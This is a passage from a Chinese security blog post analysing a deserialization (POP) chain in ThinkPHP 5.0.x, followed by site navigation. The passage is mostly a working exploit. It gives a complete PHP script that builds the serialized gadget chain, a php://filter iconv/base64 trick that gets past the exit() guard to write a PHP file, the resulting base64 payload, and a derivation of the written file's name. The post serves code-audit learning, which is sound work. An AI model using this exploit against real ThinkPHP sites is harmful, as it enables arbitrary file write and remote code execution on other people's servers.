<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>; <span class="comment">//这里连接了一个$data</span></span><br></pre></td></tr></table></figure>

<p>如果不能解决这两个问题，这条链子是没法调用的。</p>
<p>这里需要往下看</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220822150924816.png" alt="image-20220822150924816"></p>
<p>跟进到setTagItem()，</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220822151141432.png" alt="image-20220822151141432"></p>
<p>可以看见这里将<code>$filename</code>作为参数传递进去，同时在下方继续对set()函数进行了调用，将$key和$value作为参数传递了回去。</p>
<p>可以看见，在这里的<code>$value</code>是赋值为了<code>$filename</code>的值，因此，如果是构造了较为合理的<code>$filename</code>，那么就可以进行文件的写入。</p>
<p>写入了文件之后，需要考虑到代码执行的问题，因此需要对exit()函数进行绕过，这里需要用到PHP伪协议的知识，来对exit()函数进行死亡绕过。</p>
<blockquote>
<p>死亡绕过参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-0">https://xz.aliyun.com/t/8163#toc-0</a></p>
</blockquote>
<p>到这里，这条链子算是走通了。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p>按照我们现在进行的一系列分析，可以尝试写出EXP如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Windows</span> <span class="title class_">extends</span> <span class="title class_">Pipes</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Pivot</span></span>) //这里传入的需要是<span class="title">Pivot</span>的实例化对象</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="variable">$Pivot</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Pivot类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$output</span>;  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类，也就是HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//HasOne类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span> <span class="title class_">extends</span> <span class="title class_">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Query类，用来匹配$parent</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span> &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>) //传入的需要是<span class="title">Output</span>类的对象</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="variable">$model</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Output类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">styles</span> = [&quot;<span class="title class_">getAttr</span>&quot;];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$handle</span>; <span class="comment">//是Memcached类的对象，需要调用这个里面的write</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Memcached类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handler</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="variable">$handler</span>; <span class="comment">//是File类的对象，需要使用其中的set方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//File类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span>=<span class="title class_">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="string">&#x27;0&#x27;</span>, <span class="comment">//绕过getCacheKey中的第一个if</span></span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;0&#x27;</span>, <span class="comment">//绕过getCacheKey中的第二个if</span></span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php&#x27;</span>, <span class="comment">//有php+12个0+exit，共21个字符，为了凑到4的整数倍，需要加上三个字符</span></span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="string">&#x27;1&#x27;</span>; <span class="comment">//用于后续控制文件名，需要使用</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">Memcached</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>(<span class="title class_">new</span> \<span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\<span class="title function_ invoke__">Output</span>(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\<span class="title function_ invoke__">Query</span>(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\<span class="title function_ invoke__">HasOne</span>(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$Output</span>, <span class="variable">$HasOne</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$window</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后生成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aToxO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7aTowO3M6MTE6IgAqAGJpbmRBdHRyIjthOjE6e2k6MDtzOjM6Inh4eCI7fXM6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO3M6MToiMCI7czo2OiJwcmVmaXgiO3M6MToiMCI7czo0OiJwYXRoIjtzOjEwNjoicGhwOi8vZmlsdGVyL2NvbnZlcnQuaWNvbnYudXRmLTgudXRmLTd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPXh4eFBEOXdhSEFnY0dod2FXNW1ieWdwT3o4Ky8uLi9hLnBocCI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjY6IgAqAHRhZyI7czoxOiIxIjt9fX19fXM6OToiACoAcGFyZW50IjtyOjExO319fQ</span><br></pre></td></tr></table></figure>

<p>传入：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824173035726.png" alt="image-20220824173035726"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824173115023.png" alt="image-20220824173115023"></p>
<p>效果图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824173147241.png" alt="image-20220824173147241"></p>
<p>这里分析一下文件名是怎么生成的</p>
<p><strong>第一次进入set函数的时候：</strong></p>
<p>首先将$name进行md5加密，然后连接到$this-&gt;options[‘path’]后面，再加上.php</p>
<p>可以得到<code>$filename</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php8db7a8c80e67e908f96fbf22dde11df3.php</span><br></pre></td></tr></table></figure>

<p>然后进行<code>file_put_contents()</code>，可以得到第一个文件，同时第一个$data值是将恒为true的$value反序列化，得到b:1;</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824183337048.png" alt="image-20220824183337048"></p>
<p><strong>第二次进入set函数的时候：</strong></p>
<p>会经过setTagtem()函数，进行重新赋值，进入到has方法，跟进到get方法，然后重新调用到File类的getCacheKey方法，此时的$name是tag_md5(“1”),也就是<code>tag_c4ca4238a0b923820dcc509a6f75849b</code></p>
<p>然后上面的再次md5，得到<code>3b58a9545013e88c7186db11bb158c44</code>，按照之前的方法，连接到后面，就会出现新的<code>$filename</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php3b58a9545013e88c7186db11bb158c44.php</span><br></pre></td></tr></table></figure>

<p>因为这个文件不存在，会返回false所以会跳过if($this-&gt;has($key))，直接令$value等于输入的$name，也就是tag_md5(“1”)，也就是<code>tag_c4ca4238a0b923820dcc509a6f75849b</code></p>
<p>然后再次进入set()函数，这一次会进入getCacheKey()函数，然后再次md5加密，得到md5(tag_md5(“1”))，也就是$filename</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php3b58a9545013e88c7186db11bb158c44.php</span><br></pre></td></tr></table></figure>

<p>然后因为第一次进入setTagItem()函数的时候，会将tag设置为null，所以不会再进入，写入成功。</p>
<p>因此最后我们需要的文件名应该是这个格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name = &quot;a.php&quot;.md5(tag_md5(&quot;1&quot;)).&quot;.php&quot;</span><br></pre></td></tr></table></figure>

<p>两次md5都是getCacheKey中的函数。</p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7457#toc-3">https://xz.aliyun.com/t/7457#toc-3</a></p>
<p><a target="_blank" rel="noopener" href="https://www.moonsec.com/4586.html">https://www.moonsec.com/4586.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/196364#h2-5">https://www.anquanke.com/post/id/196364#h2-5</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/265088#h2-4">https://www.anquanke.com/post/id/265088#h2-4</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7457#toc-5">https://xz.aliyun.com/t/7457#toc-5</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zero_Adam/article/details/116170568?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;utm_relevant_index=2">https://blog.csdn.net/Zero_Adam/article/details/116170568?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;utm_relevant_index=2</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://Ho1L0w-By.github.io">Ho1L0w-By</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ho1l0w-by.github.io/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">https://ho1l0w-by.github.io/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Ho1L0w-By.github.io" target="_blank">Ho1L0w-By's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><div class="post_share"><div class="social-share" data-image="/img/background.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/08/05/%E5%88%9D%E8%AF%86XXE/"><img class="next-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">初识XXE</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/Myhead.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ho1L0w-By</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Ho1L0w-By"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Ho1L0w-By" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1691834629@qq.com" target="_blank" title="Email"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">主攻Web安全，D0g3成员 QQ:1691834629</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-5-0-X%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">ThinkPHP 5.0.X代码审计：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Seay%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">Seay自动审计：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">目录结构：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E5%88%A9%E7%94%A8%E7%82%B9%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">构建利用点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">利用链分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%AE%A1%E8%AE%A1%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">尝试审计：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP%E9%93%BE%EF%BC%9A"><span class="toc-number">1.7.</span> <span class="toc-text">POP链：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">1.7.1.</span> <span class="toc-text">前提:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E7%9C%8B-relation"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">首先看$relation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E6%98%AF%E7%9C%8B-modelRelation"><span class="toc-number">1.7.1.2.</span> <span class="toc-text">然后是看$modelRelation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9C%8B%E4%B8%80%E4%B8%8B-value"><span class="toc-number">1.7.1.3.</span> <span class="toc-text">最后看一下$value</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91-call"><span class="toc-number">1.7.2.</span> <span class="toc-text">触发__call():</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81if-empty-this-gt-append"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">1、if (!empty($this-&gt;append))</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81foreach-this-gt-append-as-key-gt-name"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">2、foreach ($this-&gt;append as $key &#x3D;&gt; $name)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81if-is-array-name"><span class="toc-number">1.7.2.3.</span> <span class="toc-text">3、if (is_array($name))</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81elseif-strpos-name-39-39"><span class="toc-number">1.7.2.4.</span> <span class="toc-text">4、elseif (strpos($name, &#39;.&#39;))</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81if-method-exists-this-relation"><span class="toc-number">1.7.2.5.</span> <span class="toc-text">5、if (method_exists($this, $relation))</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81if-method-exists-modelRelation-39-getBindAttr-39"><span class="toc-number">1.7.2.6.</span> <span class="toc-text">6、if (method_exists($modelRelation, &#39;getBindAttr&#39;))</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81if-bindAttr"><span class="toc-number">1.7.2.7.</span> <span class="toc-text">7、if ($bindAttr)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8%E3%80%81if-isset-this-gt-data-key"><span class="toc-number">1.7.2.8.</span> <span class="toc-text">8、if (isset($this-&gt;data[$key])) {</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.7.2.9.</span> <span class="toc-text">分析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9-call"><span class="toc-number">1.7.3.</span> <span class="toc-text">选择__call():</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.8.</span> <span class="toc-text">EXP:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">1.9.</span> <span class="toc-text">参考：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP-5.0.x POP链"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ThinkPHP-5.0.x POP链"/></a><div class="content"><a class="title" href="/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP-5.0.x POP链">ThinkPHP-5.0.x POP链</a><time datetime="2022-08-24T11:03:50.000Z" title="发表于 2022-08-24 19:03:50">2022-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/08/05/%E5%88%9D%E8%AF%86XXE/" title="初识XXE"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="初识XXE"/></a><div class="content"><a class="title" href="/2022/08/05/%E5%88%9D%E8%AF%86XXE/" title="初识XXE">初识XXE</a><time datetime="2022-08-05T07:33:19.000Z" title="发表于 2022-08-05 15:33:19">2022-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/17/guzhenren/" title="《蛊真人》——小人物的坚持"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《蛊真人》——小人物的坚持"/></a><div class="content"><a class="title" href="/2022/06/17/guzhenren/" title="《蛊真人》——小人物的坚持">《蛊真人》——小人物的坚持</a><time datetime="2022-06-17T14:58:40.000Z" title="发表于 2022-06-17 22:58:40">2022-06-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A/" title="PHP反序列化"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化"/></a><div class="content"><a class="title" href="/2022/06/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A/" 